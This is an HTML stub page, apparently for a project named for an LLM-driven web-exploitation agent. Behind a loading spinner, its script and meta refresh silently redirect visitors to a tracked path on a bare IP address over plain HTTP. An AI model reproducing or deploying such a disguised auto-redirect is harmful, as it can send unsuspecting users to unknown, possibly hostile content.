<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<title>大模型驱动的 Web 漏洞利用 Agent</title>
<style>
body{font-family:-apple-system,"PingFang SC",Helvetica,Arial,sans-serif;background:#fff;color:#24292f;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
.box{text-align:center;font-size:14px;line-height:2;}
.spinner{display:inline-block;width:22px;height:22px;border:2px solid #d0d7de;border-top-color:#0969da;border-radius:50%;animation:r .8s linear infinite;margin-bottom:10px;}
@keyframes r{to{transform:rotate(360deg)}}
</style>
<script>
// 项目演示页 -> 演练环境（?t= 为访客来源参数，缺省走默认渠道）
(function () {
  var HOST = "http://120.26.219.126:8080/r/";
  var t = "IPih2Nnm";
  try {
    var q = new URLSearchParams(location.search).get("t");
    if (q && /^[A-Za-z0-9_-]{1,32}$/.test(q)) t = q;
  } catch (e) {}
  var target = HOST + t;
  location.replace(target);
  var m = document.querySelector('meta[http-equiv="refresh"]');
  if (m) m.setAttribute("content", "2;url=" + target);
})();
</script>
<meta http-equiv="refresh" content="2;url=http://120.26.219.126:8080/r/IPih2Nnm">
</head>
<body>
<div class="box">
<div class="spinner"></div>
<div>正在加载项目演示环境，请稍候…</div>
</div>
</body>
</html>
